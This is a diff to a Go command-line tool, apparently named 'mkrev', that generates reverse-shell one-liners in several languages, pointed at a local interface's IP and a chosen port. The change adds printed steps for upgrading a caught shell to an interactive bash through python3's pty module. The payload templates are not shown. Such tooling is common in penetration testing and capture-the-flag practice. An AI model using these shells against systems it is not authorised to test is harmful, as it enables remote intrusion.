@@ -23,19 +23,24 @@ func main() {
 		interfaces := os.Args[1]
 		port := os.Args[2]
 		shell := os.Args[3]
-		crafted := generateReverseShell(interfaces, port, shell)
+		crafted := generateRShell(interfaces, port, shell)
+		fmt.Println("[+] Shell:")
 		fmt.Println(crafted)
+		fmt.Println("[+] Upgrade shell:")
+		fmt.Println("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
+		fmt.Println("export TERM=xterm")
+
 		return
 	}
-	fmt.Printf("Usage:\n\tmkrev [interface] [port] [shell]")
-	fmt.Printf("\n\tmkrev tun0 9000 py\n")
-	fmt.Printf("Shell:\n\tpy, bash, nc, php, ps, pl, rb \n")
+	fmt.Printf("[-] Usage:\tmkrev [interface] [port] [shell]\n")
+	fmt.Printf("[-] Example:\tmkrev tun0 9000 py\n")
+	fmt.Printf("[-] Shells:\tpy, bash, nc, php, ps, pl, rb \n")
 }
 
-func generateReverseShell(interfaces, port, shell string) string {
+func generateRShell(interfaces, port, shell string) string {
 	ip, ok := checkInterfaces(interfaces)
 	if !ok {
-		fmt.Println("Interfaces not found")
+		fmt.Println("[-] Error, invalid interface")
 		os.Exit(1)
 	}
 
